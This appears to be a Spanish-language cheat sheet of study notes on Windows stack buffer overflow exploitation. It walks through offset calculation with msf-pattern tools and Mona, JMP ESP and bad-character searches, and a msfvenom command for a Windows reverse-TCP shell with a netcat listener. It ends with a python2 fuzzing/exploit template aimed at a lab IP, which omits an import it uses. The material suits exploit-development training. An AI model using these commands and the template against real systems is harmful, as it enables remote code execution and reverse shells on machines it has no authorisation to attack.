# Buffer Overflow

## Desensamblar un archivo .exe 

```shell
objdump -d -Mintel goodpwd.exe > goodpwd_disassembled.txt
```


## Algunas Operaciones Inseguras
- strcpy
- vsprintf
- strcat
- printf
- gets / fgets
- memcpy
- scanf/ fscanf

## Conectarse a una maquina por RDP con xfreerdp 

```shell
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
```


## Calculado el offset
### Paso 1 
#### Generar un payload
con `msf-pattern_create`, tan grande como el numero que especifiquemos
```shell
msf-pattern_create -l 2000
```

### Paso 2
#### Copiamos el payload generado
y lo usamos en el input

### Paso 3 
#### Calcular el offset

por medio de msf-pattern_offset
```shell
msf-pattern_offset -q 30684239 
```

## Uso de Mona
### Configuramos el directorio de trabajo para Mona
```shell
!mona config -set workingfolder C:\somefolder\%p
```
### Para crear un payload con Mona 
```shell
!mona pc 100
```
### Para calcular el Offset
```shell
!mona po 61413761
```
Una vez que el EIP es sobreescrito podemos ejecutar:
```shell
!mona suggest
```
Mona nos pedirá que proporcionemos información sobre la carga útil y creará automáticamente un módulo Metasploit para explotar la aplicación.
### Modulos que no tengan ASLR activado 
```shell
!mona noaslr
```
### Verificar los modulos disponibles
```shell
!mona modules
```
### Saltar a un registro
especificamos el registro con -r
```shell
!mona jmp -r esp
```
### Especificar un modulo o mas de uno
```shell
!mona jmp -r esp -m kernel
```
o de la misma manera se puede usar para buscar con el opcode especifico:
```shell
!mona find -s "\xff\xe4" -m kernel
```
donde `xFFxE4 = JMP ESP`

Una vez que se encuentra la direccion de la instruccion se puede continuar

## Identificar los BadChars
### Lista de todos los posibles badchars
```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
### Identificar batchars con mona
Previamente debemos tener un directorio de trabajo creado y usar 
```
!mona bytearray
```
Con lo cual se creara un archivo `bytearray.bin` en la carpeta de nuestro directorio de trabajo.
Luego ejecutamos el payload mandando los batchars, y comparamos usando 
```shell
!mona compare -f C:\Users\User\Desktop\carpeta\bytearray.bin -a 0187A128
```
donde especificamos la ruta del archivo `.bin` y con el parametro `-a` especificamos la direccion del `ESP`. Lo siguiente es quitar el resultado de badchar detectado de nuestro payload y crear otro `bytearray.bin` con el siguiente comando
```shell
!mona bytearray -cpb "\x00"
```
Donde especificamos los badchar que no queremos que se incluya en el nuevo `bytearray.bin`

## Generar la shellcode
### Ejemplo de Shellcode
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.15 LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread -f c --smallest
```
Donde especificamos la aqrquitectura del sistema, los badchars que no queremos que se incluyan en el shellcode.
## Para escuchar el puerto podemos usar 
```shell
rlwrap nc -nlvp 446
```
## Alternativa al uso de NOPs en la shellcode
El desplazamiento de pila es la alternativa al uso de NOPs, para ello utilizamos `msf-metasm_shell`, ejemplo recorrer en 10 unidades
```
sub esp,0x10
```
Lo cual nos dara como resultado el siguiente opcode
```
\x83\xEC\x10
```

## Plantilla de exploit en python2
```python
import socket

host = "172.16.169.140"
port = 9999

junkbytes = "A"*100
# eip = "\xf3\x12\x17\x31"
# esp = "C"*700
# nops = "\x90"*20
# badchars = "\x00\x0A"
# shellcode = "\a0\x0d..."


buffer = junkbytes # + eip + nops + esp

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)
        s.send(buffer+"\r\n")
        message = s.recv(1024)
        print(message)
        print("[+] Payload sent with length: " + str(len(buffer)))
        s.close()
        buffer += ("A"*100)
    except Exception as ex:
        print "\n !!! Error en la conexion !!!\r\n" + str(ex)
        sys.exit(1)


```